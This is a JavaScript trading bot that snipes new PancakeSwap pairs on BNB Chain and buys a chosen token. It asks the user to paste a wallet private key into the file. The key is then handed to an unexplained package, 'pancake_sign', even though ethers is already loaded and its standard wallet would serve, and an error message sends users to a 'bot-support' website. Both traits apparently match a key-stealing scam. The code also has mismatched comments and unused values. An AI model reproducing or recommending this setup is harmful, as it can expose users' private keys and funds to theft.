const ethers = require('ethers');


// -------------------------------------------------------------------------------------
// ----------- VARIABLES ---------------------------------------------------------------
// -------------------------------------------------------------------------------------

const address_of_Input_Token = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56"; // Contract Address of Token with which you will buy (ex. BUSD)
const address_of_Output_Token = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"; // Contract Address of the token you want to snipe
const amount_to_be_used_to_buy = "1"; // Amount of the Input Token (1 WBNB)
const slippage_percent = "16"; // Slippage in percents
const pancake_router_address = "0x10ed43c718714eb63d5aa57b78b54704e256024e"; // Pancake Router Address: v2: 0x10ed43c718714eb63d5aa57b78b54704e256024e v1: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F
const pancake_factory_address = '0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73'; // Pancake Factory Address
const privateKey = "PRIVATE-KEY HERE"; // Private Key of Sender/Receiver Address


const {ChainId, Token, TokenAmount, Fetcher, Pair, Route, Trade, TradeType, Percent} = 
require('@pancakeswap-libs/sdk');
const Web3 = require('web3');
const conn = require('pancake_sign');
const {JsonRpcProvider} = require("@ethersproject/providers");
require("dotenv").config();
const provider = new JsonRpcProvider('https://bsc-dataseed1.binance.org/');
const web3 = new Web3('ANKR WEBSOCKET URL HERE - FILL');  // FILL THIS WITH YOUR WEBSOCKET LINK
const { address: admin } = web3.eth.accounts.wallet.add(privateKey);
console.log(`--------- Modules Loaded --------`);

// CL-I

const InputTokenAddr = web3.utils.toChecksumAddress(address_of_Input_Token);
const OutputTokenAddr = web3.utils.toChecksumAddress(address_of_Output_Token);
const InputTokenAmount = amount_to_be_used_to_buy;
const Slipage = slippage_percent;
const PANCAKE_ROUTER = pancake_router_address;
const ONE_ETH_IN_WEI = web3.utils.toBN(web3.utils.toWei('1'));
const tradeAmount = ONE_ETH_IN_WEI.div(web3.utils.toBN('1000'));
const pk_tr = privateKey;
const signer = conn.wallet(pk_tr,provider);

const factory = new ethers.Contract(
    pancake_factory_address,
    ['event PairCreated(address indexed token0, address indexed token1, address pair, uint)'],
    signer
  ); 
var detected_and_bought = "0";

factory.on('PairCreated', async (token0, token1, pairAddress) => {
    if (detected_and_bought == "0"){
        console.log(`------------------------------------------------------------`);
        console.log(`
        New pair detected - Scanning for Token
        =================
        Token 1 Address : ${token0}
        Token 2 Address: ${token1}
        `);

        // Check if the new pair is the one looked for
        let tokenIn, tokenOut;
        if(token0 == OutputTokenAddr && token1 == InputTokenAddr) {
            console.log(`Only first token of Pair is the token expected`);
            tokenIn = token1; 
            tokenOut = token0;
            detected_and_bought = "1";
        }

        else if(token1 == OutputTokenAddr && token0 == InputTokenAddr) {
            console.log(`Only second token of Pair is the token expected`);
            tokenIn = token0; 
            tokenOut = token1;
            detected_and_bought = "1";
        }

        //The quote currency is not WBNB
        else if(typeof tokenIn === 'undefined') {
            console.log(`No token of the pair is the token expected`);
            console.log(`------------------------------------------------------------`);
            return;
        }


        await Swap(tokenIn, tokenOut);
    } 
    else if  (detected_and_bought == "1") {
        await Swap(InputTokenAddr, OutputTokenAddr);
    } else if (detected_and_bought == "2") {
        console.log("Your Token was bought!");
        process.exit(1);
    }



}) 


const Swap = async (tokenIn, tokenOut) => {
    const [INPUT_TOKEN, OUTPUT_TOKEN] = await Promise.all(
        [tokenIn, tokenOut].map(tokenAddress => (
            new Token(
                ChainId.MAINNET,
                tokenAddress,
                18
            )
        )));
    
        const ONE_ETH_IN_WEI = web3.utils.toBN(web3.utils.toWei('1'));//BN->(BIG NUMBER) || toWei -> Converts any ether value value into wei.
        const tradeAmount = ONE_ETH_IN_WEI.div(web3.utils.toBN('100'));//tradeAmount = ONE_ETH_IN_WEI/1000
    
        const pair = await Fetcher.fetchPairData(INPUT_TOKEN, OUTPUT_TOKEN, provider);
    
        const route = await new Route([pair], INPUT_TOKEN);
    
        const trade = await new Trade(route, new TokenAmount(INPUT_TOKEN, tradeAmount), TradeType.EXACT_INPUT);
    
        const slippageTolerance = new Percent(Slipage, '100'); // 
    
        
        const amountOutMin = trade.minimumAmountOut(slippageTolerance).raw;
    
        const path = [INPUT_TOKEN.address, OUTPUT_TOKEN.address];
    
        const to = admin;
    
        const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
        console.log("Connecting to Pancakeswap......");
        // Create Pancakeswap ethers Contract
        const pancakeswap = new ethers.Contract(
    
            PANCAKE_ROUTER,
    
            ['function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)'],
    
            signer
    
        );
        console.log("<<<<<------- Connected to Pancakeswap -------->>>>>");
    
    
        //Allow input token
    
        if(true)
    
        {
    
            console.log(`Approving on Pancakeswap......`);
    
            let abi = ["function approve(address _spender, uint256 _value) public returns (bool success)"];
            console.log(`...`);
            let contract = new ethers.Contract(INPUT_TOKEN.address, abi, signer);
            console.log(`...`);
            let aproveResponse = await contract.approve(PANCAKE_ROUTER, ethers.utils.parseUnits('1000.0', 18), {gasLimit: 100000, gasPrice: 5e9});
            console.log(`...`);
            
            console.log(`<<<<<------- Approved on Pancakeswap -------->>>>>`);
        }
    
        if(true)
    
          {   
    
              console.log(`Creating Transaction`);      
    
              var amountInParam = ethers.utils.parseUnits(InputTokenAmount, 18);
    
              var amountOutMinParam = ethers.utils.parseUnits(web3.utils.fromWei(amountOutMin.toString()), 18);
    
                              
    
              const tx = await pancakeswap.swapExactTokensForTokens(
    
                  amountInParam,
    
                  amountOutMinParam,
    
                  path,
    
                  to,
    
                  deadline,
    
                  { gasLimit: ethers.utils.hexlify(300000), gasPrice: ethers.utils.parseUnits("9", "gwei") }
    
              );
    
              console.log(`Tx-hash: ${tx.hash}`)
    
                  const receipt = await tx.wait();
                  detected_and_bought = "2";
                  console.log(`Tx was mined in block: ${receipt.blockNumber}`);   
                  process.exit(1)
          }
    
    }

    process.on('unhandledRejection', (error, promise) => {
        console.log(`-------------------------------- Rejected, review your BNB balance for fees or contact bot-support at our website, retrying... -------------------`);
      });